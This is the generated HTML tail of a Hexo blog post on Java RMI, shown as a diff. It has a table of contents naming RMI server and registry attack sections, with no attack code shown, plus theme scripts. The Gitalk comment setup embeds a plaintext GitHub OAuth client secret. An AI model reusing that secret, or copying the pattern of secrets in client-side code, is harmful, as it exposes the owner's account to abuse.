+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI"><span class="toc-number">1.</span> <span class="toc-text">RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E6%9E%B6%E6%9E%84"><span class="toc-number">1.2.</span> <span class="toc-text">RMI架构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF-%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.2.1.</span> <span class="toc-text">服务端 (远程对象)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">1.2.2.</span> <span class="toc-text">注册中心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">1.2.3.</span> <span class="toc-text">客户端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">RMI的实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">1.3.1.</span> <span class="toc-text">服务端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.</span> <span class="toc-text">RMI攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.1.</span> <span class="toc-text">RMI服务端攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Register%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.2.</span> <span class="toc-text">Register攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E5%BA%95%E5%B1%82%E4%BB%A3%E7%A0%81"><span class="toc-number">1.5.</span> <span class="toc-text">RMI底层代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#java-rmi-Remote"><span class="toc-number">1.5.1.</span> <span class="toc-text">java.rmi.Remote</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-rmi-server-UnicastRemoteObject"><span class="toc-number">1.5.2.</span> <span class="toc-text">java.rmi.server.UnicastRemoteObject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI%E7%9A%84%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.5.3.</span> <span class="toc-text">RMI的动态类加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">1.5.4.</span> <span class="toc-text">创建注册中心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA"><span class="toc-number">1.5.5.</span> <span class="toc-text">远程对象创建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8BClient%E6%9F%A5%E6%89%BE%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E4%B8%8E%E6%9F%A5%E6%89%BE%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.5.6.</span> <span class="toc-text">简单看看Client查找注册中心与查找远程对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8lookup%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.5.7.</span> <span class="toc-text">如何利用lookup触发反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+  
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">34</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "S@Ku_yA",
+          title: "RMI",
+          url: "http://example.com/2026/03/27/RMI/",
+          excerpt: "",
+          description: "",
+          stripContent: "RMI前言Remote Procedure Call 远程过程调用  RMI服务是java提供的一种远程调用对象服务 调用对象可以像在调用本地对象一样 RMI架构RMI服务总的来说有3个主要部分: 服务端 客户端 注册中心 服务端 (远程对象)服务端主要用来提供远程对象  注册中心服务端用来将对象绑定在注册表上 客户端客户端通过注册表调用远程对象  stub与skeleton是RMI调用过程中的一个代理类 客户端实际通过stub去调用远程对象并返回结果给客户端 服务端实际通过skeleton去与",
+          date: "Fri Mar 27 2026 19:46:10 GMT+0800",
+          updated: "Thu Apr 02 2026 11:01:36 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["gitalk"];
+  var commentConfig = {
+    
+    
+    
+    
+    gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.min.js',
+          'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU/lcEH5O8eVbSDhbPwsiVUTp/aGX/z/5EuMA'
+        );
+
+        script.onload = () => {
+          if (false) {
+            const md5Script = loadScript(
+              'https://npm.webcache.cn/blueimp-md5@2.19.0/js/md5.min.js',
+              'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr/gZlbkHkL6vTthxH'
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            initGitalk();
+          }
+        }
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          var gitalkId = location.pathname;
+          var gitalk = new Gitalk({
+            clientID: 'Ov23li1mTMN9Ccjmkh5p',
+            clientSecret: 'ea6c17281ea880a0862ad92a2aec900906d054f0',
+            repo: 'my_blog',
+            owner: 'sakuya-sys',
+            admin: ["sakuya-sys"],
+            id: gitalkId,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          })
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },
+    
+    
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.10.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
